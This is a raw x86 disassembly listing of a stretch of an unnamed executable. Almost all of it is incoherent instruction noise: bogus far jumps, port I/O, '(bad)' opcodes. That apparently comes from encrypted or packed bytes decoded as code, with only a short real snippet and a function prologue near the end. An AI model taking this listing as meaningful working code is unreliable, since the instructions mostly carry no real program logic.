  40df12:	sub    BYTE PTR [ebx],0xb6
  40df15:	inc    ecx
  40df16:	push   ds
  40df17:	mov    eax,ds:0x19a0b6cd
  40df1c:	dec    ebx
  40df1d:	sbb    bh,0xd5
  40df20:	call   0xc8ebb826
  40df25:	stos   BYTE PTR es:[edi],al
  40df26:	aaa    
  40df27:	add    cl,cl
  40df29:	popf   
  40df2a:	fwait
  40df2b:	mov    al,ds:0x35900b21
  40df30:	data16 sar BYTE PTR cs:[ecx-0x44faee9c],0x98
  40df39:	inc    edx
  40df3a:	in     eax,dx
  40df3b:	arpl   cx,bp
  40df3d:	mov    ah,0x2c
  40df3f:	das    
  40df40:	(bad)  
  40df41:	retf   
  40df42:	xchg   edx,eax
  40df43:	dec    ebx
  40df45:	je     0x40df16
  40df47:	mov    ds:0xf5260786,al
  40df4c:	jo     0x40df63
  40df4e:	enter  0xb3cf,0xfa
  40df52:	jmp    0xda04:0xb4771e19
  40df59:	shl    BYTE PTR [ebx+0x76],1
  40df5c:	add    esi,DWORD PTR [ebx+esi*1]
  40df5f:	dec    edi
  40df60:	or     al,0xb6
  40df62:	xchg   DWORD PTR [ebp-0x2c],esp
  40df65:	ds stc 
  40df67:	mov    ecx,0xf91a8bf2
  40df6c:	nop
  40df6d:	mov    esi,es
  40df6f:	out    dx,eax
  40df70:	lods   eax,DWORD PTR ds:[esi]
  40df71:	fs mov ah,0x18
  40df74:	popf   
  40df75:	mov    esi,0xe56cd987
  40df7a:	clc    
  40df7b:	in     eax,0xd8
  40df7d:	clc    
  40df7e:	push   eax
  40df7f:	add    DWORD PTR [ecx+0x3cb9569e],ebp
  40df85:	add    eax,0x257c696
  40df8a:	cwde   
  40df8b:	cmp    al,0x9
  40df8d:	cmp    edi,edi
  40df8f:	addr16 xchg bh,al
  40df92:	rcl    BYTE PTR [esi+0x3a],1
  40df95:	xor    al,0x39
  40df97:	cmp    al,0xb6
  40df99:	mov    ecx,0xffefb238
  40df9e:	mov    ds:0x3478de8c,al
  40dfa3:	call   0xe6b35ce9
  40dfa8:	pop    eax
  40dfa9:	out    dx,al
  40dfaa:	pop    esp
  40dfab:	pop    eax
  40dfac:	cmovno ecx,DWORD PTR [eax+0x12ee6be6]
  40dfb3:	mov    cl,0x36
  40dfb5:	sar    BYTE PTR [ecx-0x1d1970e4],cl
  40dfbb:	adc    al,0x19
  40dfbd:	jnp    0x40dfbb
  40dfbf:	pushf  
  40dfc0:	cmp    DWORD PTR [ebx+0x2a],eax
  40dfc3:	in     eax,0x3
  40dfc5:	jmp    0x40dfe2
  40dfc7:	(bad)  
  40dfc8:	or     edx,DWORD PTR ds:0x1cc6e69c
  40dfce:	fdivr  st,st(0)
  40dfd0:	jne    0x40df5b
  40dfd2:	aaa    
  40dfd3:	xchg   DWORD PTR [ecx-0x1c],ebp
  40dfd6:	pop    eax
  40dfd7:	xchg   BYTE PTR [eax-0x61],ah
  40dfda:	pop    ecx
  40dfdb:	jmp    0x1730bb84
  40dfe0:	xor    BYTE PTR [ebx+0x1f],cl
  40dfe3:	fstp   DWORD PTR [ebp-0x47]
  40dfe6:	retf   
  40dfe7:	retf   0x13af
  40dfea:	retf   
  40dfeb:	js     0x40e03b
  40dfed:	in     eax,dx
  40dfee:	jle    0x40dfa5
  40dff0:	mov    ch,0x46
  40dff2:	sub    ebx,DWORD PTR [ebx]
  40dff4:	stos   DWORD PTR es:[edi],eax
  40dff5:	dec    edi
  40dff6:	leave  
  40dff7:	mov    edi,0x7e8e8a4
  40dffc:	aad    0x64
  40dffe:	jmp    0xa9658f29
  40e003:	mov    ah,0x52
  40e005:	xchg   esi,eax
  40e006:	jns    0x40df8e
  40e008:	and    al,0xad
  40e00a:	leave  
  40e00b:	cs js  0x40e087
  40e00e:	push   ebx
  40e00f:	cmc    
  40e010:	pop    esp
  40e011:	mov    ch,0x27
  40e013:	repnz gs aaa 
  40e016:	xor    DWORD PTR [ecx-0x6e],ebp
  40e019:	cs aas 
  40e01b:	mov    edx,0x4ebc5c72
  40e020:	jbe    0x40e062
  40e022:	cmp    eax,0x66908e5d
  40e027:	inc    ebx
  40e028:	call   0x32740b60
  40e02d:	lods   al,BYTE PTR ds:[esi]
  40e02e:	or     BYTE PTR ds:0x6e9d4aed,dh
  40e034:	int    0x60
  40e036:	inc    ebp
  40e037:	mov    al,0xfc
  40e039:	enter  0xcabd,0x35
  40e03d:	fnsave [edx+eax*8-0x52]
  40e041:	cdq    
  40e042:	sub    dl,ch
  40e044:	iret   
  40e045:	into   
  40e046:	les    eax,FWORD PTR [ecx]
  40e048:	add    eax,DWORD PTR [esi]
  40e04a:	push   esi
  40e04b:	fist   DWORD PTR [ebp+0x6a]
  40e04e:	fucomi st,st(7)
  40e050:	mov    edi,0x5803b83c
  40e055:	mov    al,ds:0x635d5184
  40e05a:	mov    ebx,DWORD PTR [ebx-0x68]
  40e05d:	ror    DWORD PTR [edx],0x34
  40e060:	push   cs
  40e061:	sub    BYTE PTR [ebx-0x76],bh
  40e064:	lock cld 
  40e066:	call   0x283d:0x7ad0cc0f
  40e06d:	mov    eax,ds:0x5856ed80
  40e072:	out    0xa7,al
  40e074:	or     eax,0xea13afb5
  40e079:	pop    ecx
  40e07a:	in     eax,0x77
  40e07c:	jbe    0x40e065
  40e07e:	mov    esi,0xd301302a
  40e083:	lahf   
  40e084:	sbb    DWORD PTR [edi+eiz*1-0x125d7bf2],ecx
  40e08b:	xlat   BYTE PTR ds:[ebx]
  40e08c:	int3   
  40e08d:	dec    ebx
  40e08e:	cmp    BYTE PTR [esi],ch
  40e090:	pop    esi
  40e091:	xchg   esi,eax
  40e092:	push   es
  40e093:	mov    ss,ebp
  40e095:	jge    0x40e0ef
  40e097:	pop    es
  40e098:	lods   eax,DWORD PTR ds:[esi]
  40e099:	int    0xb2
  40e09b:	sub    BYTE PTR [ebx],ah
  40e09d:	sbb    ecx,DWORD PTR [ecx+esi*1-0x6cc49d9d]
  40e0a4:	mov    cl,0x97
  40e0a6:	popa   
  40e0a7:	cs ins BYTE PTR es:[edi],dx
  40e0a9:	sub    edx,DWORD PTR [ecx+0x6d]
  40e0ac:	sbb    al,0x6c
  40e0ae:	jp     0x40e039
  40e0b0:	inc    esp
  40e0b1:	mov    BYTE PTR [ebx+0x3c65f4b6],dl
  40e0b7:	stc    
  40e0b8:	sbb    eax,0x75ac6e04
  40e0bd:	xchg   esp,eax
  40e0be:	sbb    esi,DWORD PTR [ecx+edi*1+0x53]
  40e0c2:	mov    ?,ecx
  40e0c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0c5:	leave  
  40e0c6:	xlat   BYTE PTR ds:[ebx]
  40e0c7:	jbe    0x40e10c
  40e0c9:	and    edx,DWORD PTR [esi-0x10d0438c]
  40e0cf:	dec    ebp
  40e0d0:	inc    edi
  40e0d1:	out    0x80,eax
  40e0d3:	shl    DWORD PTR [ebp+eax*1+0x15],1
  40e0d7:	das    
  40e0d8:	div    cl
  40e0da:	fist   DWORD PTR [ebx+ecx*4-0x62]
  40e0de:	xacquire xchg DWORD PTR [edx+0x2f],ebp
  40e0e2:	sub    DWORD PTR [ebx+0x1b],0x82908d1c
  40e0e9:	fstp   DWORD PTR [ebx+eiz*8-0x4b4eb9a2]
  40e0f0:	cmp    DWORD PTR [eax-0x5afecfd3],esi
  40e0f6:	push   edi
  40e0f7:	xor    ebp,DWORD PTR [edx-0x695c04de]
  40e0fd:	inc    ebx
  40e0fe:	adc    bh,BYTE PTR ds:0x1b709643
  40e104:	enter  0x9dd,0xd3
  40e108:	or     ebx,esp
  40e10a:	in     eax,0x41
  40e10c:	ins    DWORD PTR es:[edi],dx
  40e10d:	mov    ebp,0x4309774e
  40e112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e113:	shl    DWORD PTR [esi+0x74],0xd9
  40e117:	in     al,dx
  40e118:	xchg   ebp,eax
  40e119:	adc    eax,0x7b4202e6
  40e11e:	and    DWORD PTR [esi+0x530382eb],0x73
  40e125:	xor    eax,0x8619d891
  40e12a:	je     0x40e151
  40e12c:	fwait
  40e12d:	xor    eax,edx
  40e12f:	inc    edi
  40e130:	sbb    al,0x79
  40e132:	inc    esi
  40e133:	push   eax
  40e134:	std    
  40e135:	adc    DWORD PTR [esi-0x53],ebx
  40e138:	dec    esi
  40e139:	push   es
  40e13a:	fs aas 
  40e13c:	and    esi,esi
  40e13e:	xchg   ecx,eax
  40e13f:	add    DWORD PTR [edi-0x23a6bc1f],ecx
  40e145:	fisubr DWORD PTR [esi+0x11503049]
  40e14b:	aas    
  40e14c:	je     0x40e1b8
  40e14e:	shl    DWORD PTR [ebx+edi*2+0x4e8ce38b],0xb4
  40e156:	pop    ss
  40e157:	push   DWORD PTR ds:[eax+ecx*2-0x496d9dc6]
  40e15f:	cmp    dh,BYTE PTR [ecx+0x518735c]
  40e165:	div    BYTE PTR [ebx+0x143e5eee]
  40e16b:	mul    BYTE PTR [ecx]
  40e16d:	(bad)  
  40e16e:	int3   
  40e16f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e170:	imul   esp,DWORD PTR [ebx+edi*1],0x79
  40e174:	mov    edx,0x4f4e1e1b
  40e179:	push   es
  40e17a:	xchg   esp,eax
  40e17b:	mov    DWORD PTR [eax],eax
  40e17d:	inc    ebp
  40e17e:	dec    ebp
  40e17f:	in     al,dx
  40e180:	test   DWORD PTR [ebp-0x43f3ab1],0x965c9b03
  40e18a:	sti    
  40e18b:	or     al,al
  40e18d:	call   0x173654ed
  40e192:	lods   eax,DWORD PTR ds:[esi]
  40e193:	and    al,0xd6
  40e195:	dec    ecx
  40e196:	leave  
  40e197:	dec    esp
  40e198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e199:	jns    0x40e1a8
  40e19b:	push   eax
  40e19c:	fnsave [esi]
  40e19e:	loopne 0x40e17e
  40e1a0:	imul   ecx,DWORD PTR ds:0xbf18847,0x25
  40e1a7:	lock arpl WORD PTR [ebp+0x1df117e8],ax
  40e1ae:	sub    esp,DWORD PTR [ecx+ebx*8-0x788cf4d8]
  40e1b5:	add    DWORD PTR [ebx+0x24c4eaaf],edx
  40e1bb:	dec    ecx
  40e1bc:	add    DWORD PTR [ebp+esi*8-0x79866a74],ecx
  40e1c3:	mov    eax,0x63076560
  40e1c8:	lods   eax,DWORD PTR ds:[esi]
  40e1c9:	repnz xor ebx,DWORD PTR [ebx+0x4d077d9f]
  40e1d0:	and    BYTE PTR [edx-0x64],ah
  40e1d3:	mov    esi,0x42203301
  40e1d8:	xlat   BYTE PTR ds:[ebx]
  40e1d9:	cld    
  40e1da:	dec    esp
  40e1db:	and    DWORD PTR [ebp+edx*4-0x49],eax
  40e1df:	dec    esi
  40e1e0:	std    
  40e1e1:	stos   BYTE PTR es:[edi],al
  40e1e2:	xchg   ebp,ecx
  40e1e4:	in     al,dx
  40e1e5:	pop    ds
  40e1e6:	mov    ecx,0x46707364
  40e1eb:	mov    bh,0xbc
  40e1ed:	sub    dh,BYTE PTR [ebx]
  40e1ef:	test   DWORD PTR [edi-0x4bec5c89],ebp
  40e1f5:	mov    edi,0xaeb7083
  40e1fa:	leave  
  40e1fb:	cmp    dh,BYTE PTR ds:0x1b5878c1
  40e201:	push   esp
  40e202:	call   0xab0f:0xda42f7f2
  40e209:	push   esp
  40e20a:	stos   BYTE PTR es:[edi],al
  40e20b:	cmp    BYTE PTR [edi+0x62a97306],0x8d
  40e212:	cwde   
  40e213:	push   0x60
  40e215:	xor    al,0x68
  40e217:	mov    WORD PTR [esp+eax*1-0x38],?
  40e21b:	out    0x92,al
  40e21d:	or     edx,DWORD PTR [eax]
  40e21f:	adc    DWORD PTR [esi+eiz*2+0x7c],0x9c386f1a
  40e227:	call   0x46eb467d
  40e22c:	sbb    DWORD PTR fs:[esp+ecx*4+0x32],0x4af3a0ad
  40e235:	sbb    bh,BYTE PTR [eax+0x4f4cfe96]
  40e23b:	sti    
  40e23c:	test   DWORD PTR [ebp-0xe],esi
  40e23f:	mov    al,0x17
  40e241:	xchg   ecx,eax
  40e242:	mov    ds:0x75d61281,eax
  40e247:	popa   
  40e248:	cmp    BYTE PTR [eax-0x417f7811],ah
  40e24e:	scas   al,BYTE PTR es:[edi]
  40e24f:	fwait
  40e250:	mov    eax,0x19a9fded
  40e255:	scas   eax,DWORD PTR es:[edi]
  40e256:	jae    0x40e293
  40e258:	cmc    
  40e259:	cmp    BYTE PTR [esi],dh
  40e25b:	push   ecx
  40e25c:	inc    eax
  40e25d:	int3   
  40e25e:	repnz and DWORD PTR [ebx],esi
  40e261:	iret   
  40e262:	(bad)
  40e267:	sbb    al,0x31
  40e269:	cli    
  40e26a:	mov    eax,?
  40e26c:	push   eax
  40e26d:	sub    edx,DWORD PTR [esi-0x40d3c0ee]
  40e273:	xchg   edi,eax
  40e274:	int3   
  40e275:	push   edx
  40e276:	retf   
  40e277:	or     eax,0x406b1bf4
  40e27c:	xchg   ebx,eax
  40e27d:	push   ecx
  40e27e:	xchg   edi,eax
  40e27f:	in     al,0x14
  40e281:	sbb    dl,dl
  40e283:	sbb    al,0x34
  40e285:	fwait
  40e286:	mov    fs,WORD PTR [ebp+0x26]
  40e289:	jo     0x40e2e6
  40e28b:	mov    eax,ds:0xe7ab607b
  40e290:	leave  
  40e291:	aad    0x10
  40e293:	pop    esp
  40e294:	push   ss
  40e295:	call   0x43b0e60
  40e29a:	jge    0x40e28c
  40e29c:	mov    edx,DWORD PTR [ebp-0x20]
  40e29f:	mov    ebx,DWORD PTR [ebp-0x8]
  40e2a2:	xor    edx,eax
  40e2a4:	add    edx,ecx
  40e2a6:	imul   edx,ebx
  40e2a9:	cmp    edx,edi
  40e2ab:	jbe    0x40a4fb
  40e2b1:	pop    ebx
  40e2b2:	jmp    0x40e6c9
  40e2b7:	mov    BYTE PTR [edi+0x6af53ecb],bl
  40e2bd:	xchg   ebp,eax
  40e2be:	imul   esp,ecx,0x335e5ddc
  40e2c4:	ret    
  40e2c5:	and    bl,dl
  40e2c7:	cs stos BYTE PTR es:[edi],al
  40e2c9:	jle    0x40e349
  40e2cb:	jo     0x40e346
  40e2cd:	jle    0x40e34d
  40e2cf:	es jo  0x40e267
  40e2d2:	inc    esp
  40e2d3:	movzx  ebp,BYTE PTR [edi-0x194aa02b]
  40e2da:	mov    edx,0x6a36aea8
  40e2df:	or     ebx,esp
  40e2e1:	(bad)  
  40e2e2:	es js  0x40e309
  40e2e5:	mov    ds:0xdf9547b1,eax
  40e2ea:	pop    eax
  40e2eb:	ror    BYTE PTR [eax],1
  40e2ed:	and    dl,BYTE PTR [eax]
  40e2ef:	dec    edi
  40e2f0:	pop    edx
  40e2f1:	and    ebp,0x12
  40e2f4:	test   eax,0x65d96d77
  40e2f9:	nop
  40e2fa:	das    
  40e2fb:	push   ebx
  40e2fc:	sbb    BYTE PTR [ebx+0x1],0x39
  40e300:	ja     0x40e2eb
  40e302:	retf   
  40e303:	int    0x92
  40e305:	xchg   DWORD PTR [edi],ebx
  40e307:	scas   eax,DWORD PTR es:[edi]
  40e308:	lds    ecx,FWORD PTR [eax+0x71]
  40e30b:	or     BYTE PTR [ebx-0x6],ch
  40e30e:	add    eax,DWORD PTR [esi+0x4e593588]
  40e314:	sub    BYTE PTR [ecx-0x399f50cb],dh
  40e31a:	ins    DWORD PTR es:[edi],dx
  40e31b:	in     eax,dx
  40e31c:	std    
  40e31d:	arpl   WORD PTR [edx+0x42],di
  40e320:	dec    esp
  40e321:	gs loope 0x40e378
  40e324:	mov    ds:0xfa73170e,eax
  40e329:	into   
  40e32a:	sbb    ebx,DWORD PTR [edx]
  40e32c:	into   
  40e32d:	imul   esi,DWORD PTR [esi-0x4f1bf296],0xffffff8f
  40e334:	faddp  st(2),st
  40e336:	fucomip st,st(3)
  40e338:	loopne 0x40e360
  40e33a:	loopne 0x40e312
  40e33c:	addr16 xchg edi,eax
  40e33e:	leave  
  40e33f:	sti    
  40e340:	jns    0x40e336
  40e342:	cs addr16 pop esp
  40e345:	stos   DWORD PTR es:[edi],eax
  40e346:	or     al,0xfb
  40e348:	and    edx,DWORD PTR [edx+ecx*2]
  40e34b:	xor    ecx,ebp
  40e34d:	ror    BYTE PTR [edi-0x7bb4b2f2],1
  40e353:	add    DWORD PTR [ecx-0x6c],ebx
  40e356:	imul   ebp,edi,0x1
  40e359:	mov    edx,0x16425c9
  40e35e:	leave  
  40e35f:	jbe    0x40e30e
  40e361:	mov    bh,0xa1
  40e363:	leave  
  40e364:	ss jmp 0xf4c8:0x5fc7fa1
  40e36c:	mov    ch,0x90
  40e36e:	ror    BYTE PTR [ecx],1
  40e370:	fmul   st(7),st
  40e372:	scas   eax,DWORD PTR es:[edi]
  40e373:	add    DWORD PTR [edi],0x48
  40e376:	call   0x38a9d04e
  40e37b:	jnp    0x40e397
  40e37d:	ror    cl,cl
  40e37f:	cmp    BYTE PTR [ebp+0x53],al
  40e382:	(bad)  
  40e384:	cmp    cl,0x32
  40e387:	push   0x5e1fbf37
  40e38c:	or     BYTE PTR [esi],ch
  40e38e:	stc    
  40e38f:	ss inc esp
  40e391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e392:	daa    
  40e393:	jno    0x40e32f
  40e395:	push   ebp
  40e396:	jle    0x40e38d
  40e398:	je     0x40e36b
  40e39a:	xchg   edx,eax
  40e39b:	mov    bl,0x8e
  40e39d:	push   ss
  40e39e:	push   esi
  40e39f:	inc    eax
  40e3a0:	adc    cl,BYTE PTR [edi-0x19a3012]
  40e3a6:	mov    bh,0x61
  40e3a8:	push   edx
  40e3a9:	js     0x40e380
  40e3ab:	mov    al,0x44
  40e3ad:	imul   ebp,esp,0x6484054b
  40e3b3:	mov    ah,0xf2
  40e3b5:	push   ecx
  40e3b6:	cmp    BYTE PTR [eax+eax*4-0x57],dl
  40e3ba:	mov    edi,0x8253d7cd
  40e3bf:	(bad)  
  40e3c0:	jbe    0x40e40b
  40e3c2:	or     DWORD PTR [esi-0x75],0xffffff97
  40e3c6:	in     eax,dx
  40e3c7:	mov    dh,0x77
  40e3c9:	fucom  st(2)
  40e3cb:	xchg   esi,eax
  40e3cc:	std    
  40e3cd:	(bad)  
  40e3ce:	mov    eax,ds:0x98c2cdf4
  40e3d3:	je     0x40e438
  40e3d5:	nop
  40e3d6:	mov    edi,0x4682bf6e
  40e3db:	sbb    BYTE PTR [edi+0x23],bl
  40e3de:	pop    edx
  40e3df:	push   ebx
  40e3e0:	outs   dx,DWORD PTR ds:[esi]
  40e3e1:	sub    DWORD PTR [ebx+eax*8],0xa0bafd7b
  40e3e8:	cmp    al,0x13
  40e3ea:	mov    ecx,0x11583cce
  40e3ef:	cdq    
  40e3f0:	dec    eax
  40e3f1:	push   ebp
  40e3f2:	loopne 0x40e38f
  40e3f4:	lods   al,BYTE PTR ds:[esi]
  40e3f5:	std    
  40e3f6:	int    0xce
  40e3f8:	lock jb 0x40e475
  40e3fb:	adc    cl,ch
  40e3fd:	mov    cs,WORD PTR [edi-0x213e3477]
  40e403:	and    dl,cl
  40e405:	(bad)  
  40e406:	cmp    al,0x79
  40e408:	jl     0x40e3a0
  40e40a:	pop    ebx
  40e40b:	sub    eax,0x8be79c7b
  40e410:	sub    eax,0x76f30682
  40e415:	jle    0x40e3c0
  40e417:	mov    al,ds:0x3ec834bc
  40e41c:	mov    dl,0x14
  40e41e:	mov    bl,0x70
  40e420:	or     eax,0xd0e10bbf
  40e425:	pushf  
  40e426:	inc    edx
  40e427:	mov    esp,0x4cbe174c
  40e42d:	mov    cl,0xe0
  40e42f:	and    BYTE PTR [ebp+0x5e],bh
  40e432:	ss mov ecx,0x34bfda84
  40e438:	mov    edi,0x9b3acd8f
  40e43d:	(bad)  
  40e43e:	pusha  
  40e43f:	jmp    FWORD PTR ds:[edx-0x1f87eabf]
  40e446:	ins    DWORD PTR es:[edi],dx
  40e447:	popa   
  40e448:	in     eax,0xdc
  40e44a:	call   0x387:0xbf5b720a
  40e451:	jp     0x40e475
  40e453:	je     0x40e46f
  40e455:	loopne 0x40e3d7
  40e457:	fstp   TBYTE PTR [ebp-0x69]
  40e45a:	and    edi,DWORD PTR [esi-0x33]
  40e45d:	mov    eax,0x77918d0a
  40e462:	mov    bh,0xfc
  40e464:	bound  ecx,QWORD PTR [edi-0x16e3f030]
  40e46a:	sbb    BYTE PTR [ebx+0x30],bh
  40e46d:	loop   0x40e419
  40e46f:	cmp    eax,0xd0c7866a
  40e474:	in     al,0x99
  40e476:	stos   BYTE PTR es:[edi],al
  40e477:	jp     0x40e4a0
  40e479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e47a:	adc    ecx,DWORD PTR [eax]
  40e47c:	scas   al,BYTE PTR es:[edi]
  40e47d:	shl    BYTE PTR [eax-0x26],0x9a
  40e481:	scas   al,BYTE PTR es:[edi]
  40e482:	mov    dl,0x5f
  40e484:	jge    0x40e46a
  40e486:	jecxz  0x40e412
  40e488:	pop    edi
  40e489:	ja     0x40e462
  40e48b:	addr16 push es
  40e48d:	mov    eax,ds:0x9069fcfa
  40e492:	push   edx
  40e493:	jo     0x40e455
  40e495:	arpl   WORD PTR [esi+eiz*1+0x2fa6099],ax
  40e49c:	or     al,0x14
  40e49e:	push   edx
  40e49f:	arpl   bp,bp
  40e4a1:	mov    BYTE PTR [edx+eax*8+0x30e652c],ah
  40e4a8:	aad    0xe6
  40e4aa:	fmulp  st(6),st
  40e4ac:	repz jmp 0xd83e:0xa22a9950
  40e4b4:	mov    DWORD PTR [esi-0x7],edx
  40e4b7:	cld    
  40e4b8:	cld    
  40e4b9:	jmp    0x3c27:0xbbd209d1
  40e4c0:	xor    DWORD PTR [edi*4-0x3a8c8b19],esp
  40e4c7:	mov    ecx,0x9b1720eb
  40e4cc:	cld    
  40e4cd:	rcl    al,0xed
  40e4d0:	xchg   ebp,eax
  40e4d1:	scas   eax,DWORD PTR es:[edi]
  40e4d2:	ins    DWORD PTR es:[edi],dx
  40e4d3:	ret    
  40e4d4:	out    0x89,al
  40e4d6:	in     al,dx
  40e4d7:	daa    
  40e4d8:	std    
  40e4d9:	cmp    edi,DWORD PTR [edx+0x3d]
  40e4dc:	jecxz  0x40e543
  40e4de:	and    BYTE PTR [esi+edx*8-0x51],ah
  40e4e2:	cld    
  40e4e3:	and    al,BYTE PTR [eax-0x3d05b47b]
  40e4e9:	inc    ecx
  40e4ea:	std    
  40e4eb:	push   ss
  40e4ec:	into   
  40e4ed:	mov    eax,0xae3a634c
  40e4f2:	jmp    0xd524b992
  40e4f7:	add    bh,al
  40e4f9:	adc    BYTE PTR [ecx-0x37e89ba5],cl
  40e4ff:	inc    eax
  40e500:	fild   QWORD PTR [edi+eax*1]
  40e503:	mov    cl,0x1
  40e505:	test   DWORD PTR ds:0x587e3df7,eax
  40e50b:	jno    0x40e4d1
  40e50d:	pop    ecx
  40e50e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e50f:	sub    BYTE PTR ss:[edi-0x2dc5af7],0x5f
  40e517:	xor    eax,0xe909736f
  40e51c:	jbe    0x40e4bc
  40e51e:	(bad)  
  40e51f:	call   DWORD PTR [ebp+esi*1-0x413a767a]
  40e526:	inc    esp
  40e527:	inc    edx
  40e528:	in     al,dx
  40e529:	sub    al,0x4
  40e52b:	push   DWORD PTR [edx]
  40e52d:	leave  
  40e52e:	cs pop ss
  40e530:	inc    ebx
  40e531:	rol    DWORD PTR [ecx],cl
  40e533:	pop    es
  40e534:	xor    eax,0x6bc06bcf
  40e539:	jge    0x40e524
  40e53b:	xchg   esi,eax
  40e53c:	jecxz  0x40e56c
  40e53e:	ds push esp
  40e540:	lods   al,BYTE PTR ds:[esi]
  40e541:	sar    BYTE PTR [ebx-0x79],1
  40e544:	adc    eax,DWORD PTR [eax-0x56]
  40e547:	mov    BYTE PTR [eax+0xb],cl
  40e54a:	ss inc edi
  40e54c:	(bad)  
  40e54d:	outs   dx,DWORD PTR ds:[esi]
  40e54e:	test   al,0x59
  40e550:	inc    ecx
  40e551:	pop    ss
  40e552:	inc    esp
  40e553:	jmp    0xf7074d44
  40e558:	loope  0x40e4e6
  40e55a:	gs pop si
  40e55d:	and    dl,BYTE PTR [edx+0x7087915a]
  40e563:	jb     0x40e523
  40e565:	and    bl,BYTE PTR [esi]
  40e567:	sahf   
  40e568:	mov    esi,0x45dac6df
  40e56d:	fmul   DWORD PTR [edi-0x12]
  40e570:	mov    ebp,0xcf46eae0
  40e575:	inc    esp
  40e576:	and    eax,0xc2485213
  40e57b:	and    BYTE PTR [ebx+0x7],dh
  40e57e:	and    bh,dl
  40e580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e581:	adc    al,0xa7
  40e583:	or     BYTE PTR [esi],al
  40e585:	ss scas eax,DWORD PTR es:[edi]
  40e587:	and    dh,0x26
  40e58a:	adc    bl,BYTE PTR [eax+0x7c0c2d19]
  40e590:	xchg   DWORD PTR [edx],esi
  40e592:	cmp    eax,0x3b0f8b6c
  40e597:	imul   eax,DWORD PTR [esi],0xd6e155e3
  40e59d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e59e:	mov    dh,BYTE PTR [edi-0x3c]
  40e5a1:	popa   
  40e5a2:	sub    eax,0x4d3dec43
  40e5a7:	sub    eax,0x71f64a0c
  40e5ac:	jmp    0x40e5ea
  40e5ae:	retf   0xab32
  40e5b1:	pop    ecx
  40e5b2:	cmp    ecx,DWORD PTR [ebp+esi*1-0x7d9d2868]
  40e5b9:	loopne 0x40e565
  40e5bb:	fwait
  40e5bc:	mov    ds:0xbb992f5b,al
  40e5c1:	and    eax,0x5107cc9a
  40e5c6:	js     0x40e5fe
  40e5c8:	sbb    al,0x2a
  40e5ca:	mov    WORD PTR [edx+0x25],cs
  40e5cd:	inc    eax
  40e5ce:	pop    ebp
  40e5cf:	ror    BYTE PTR [ecx],1
  40e5d1:	jmp    0x40e651
  40e5d3:	inc    esi
  40e5d4:	or     bl,BYTE PTR [edx-0x5d7febae]
  40e5da:	stc    
  40e5db:	mov    edi,0x76b4731a
  40e5e0:	add    BYTE PTR [edx-0x26696fef],0x10
  40e5e7:	push   cs
  40e5e8:	(bad)  
  40e5e9:	xchg   ecx,eax
  40e5ea:	fsub   DWORD PTR [ebx]
  40e5ec:	sbb    eax,DWORD PTR [edi-0x7]
  40e5ef:	je     0x40e5ed
  40e5f1:	sub    al,0xf2
  40e5f3:	inc    eax
  40e5f4:	arpl   WORD PTR [ecx],dx
  40e5f6:	xor    bh,BYTE PTR [ebx]
  40e5f8:	and    DWORD PTR [ebp-0x6c578d12],0xfffffff6
  40e5ff:	inc    edi
  40e600:	xor    dl,BYTE PTR [ecx-0x5e17732a]
  40e606:	fs pop eax
  40e608:	(bad)  
  40e609:	mov    ds:0x58242424,eax
  40e60e:	out    0x42,eax
  40e610:	nop
  40e611:	daa    
  40e612:	mov    ds:0xae38d781,eax
  40e617:	lahf   
  40e618:	or     eax,0xb0d03553
  40e61d:	xchg   ebx,eax
  40e61e:	lods   al,BYTE PTR ds:[esi]
  40e61f:	jg     0x40e671
  40e621:	push   edx
  40e622:	sbb    eax,0x806ea4d4
  40e627:	dec    esi
  40e629:	dec    eax
  40e62a:	jmp    0x40e652
  40e62c:	pusha  
  40e62d:	es jp  0x40e65f
  40e630:	or     BYTE PTR [eax+0x5b1d1302],dl
  40e636:	cmp    al,0xce
  40e638:	push   ebx
  40e639:	cmp    al,0x8c
  40e63b:	icebp  
  40e63c:	dec    edi
  40e63d:	repz dec edi
  40e63f:	(bad)  
  40e641:	mov    ah,0x1d
  40e643:	xor    esp,0xffffffbf
  40e646:	div    BYTE PTR [edx]
  40e648:	mov    esp,0x905aa0c7
  40e64d:	sbb    eax,0x62acddd5
  40e652:	cmp    DWORD PTR [edx-0x18],ecx
  40e655:	cmp    edi,DWORD PTR [esi+0xe]
  40e658:	mov    edx,0xdd0093db
  40e65d:	xor    bh,BYTE PTR [esi-0x484dc648]
  40e663:	out    dx,eax
  40e664:	rcr    BYTE PTR [esi-0x74c97082],1
  40e66a:	mov    edi,esp
  40e66c:	jnp    0x40e698
  40e66e:	and    BYTE PTR [edx-0x11],dh
  40e671:	jmp    edi
  40e673:	int    0xa8
  40e675:	inc    ebp
  40e676:	lock xchg edx,eax
  40e678:	mov    edx,0x7dd13a47
  40e67d:	inc    edi
  40e67e:	enter  0x96fa,0x7e
  40e682:	push   cs
  40e683:	mov    ah,0x1a
  40e685:	add    DWORD PTR gs:[edi-0x518660a3],0xffffff8c
  40e68d:	mov    eax,0xf4b921a9
  40e692:	cmc    
  40e693:	loopne 0x40e711
  40e695:	fcmovu st,st(2)
  40e697:	dec    esp
  40e698:	mov    dh,0x6a
  40e69a:	sbb    al,0x12
  40e69c:	out    dx,eax
  40e69d:	jp     0x40e6cd
  40e69f:	data16 (bad) 
  40e6a2:	cs pop ecx
  40e6a4:	mov    DWORD PTR [ebp-0x29b3a86a],esi
  40e6aa:	adc    eax,0xe3d4b65e
  40e6af:	sar    DWORD PTR [edx],cl
  40e6b1:	cmp    edi,DWORD PTR [ebp-0x2a3069d0]
  40e6b7:	pop    eax
  40e6b8:	out    dx,al
  40e6b9:	xchg   ecx,eax
  40e6ba:	sub    eax,0x9a21f6a2
  40e6bf:	mov    DWORD PTR [ecx+eax*2-0x6996e45f],ecx
  40e6c6:	and    eax,0xc95ffa0e
  40e6cb:	ret    0x8
  40e6ce:	push   ebp
  40e6cf:	mov    ebp,esp
  40e6d1:	sub    esp,0xa8
  40e6d7:	sbb    DWORD PTR ds:0x434713,0x1bda
  40e6e1:	push   ebx
  40e6e2:	sbb    DWORD PTR ds:0x4346c3,0x5a23
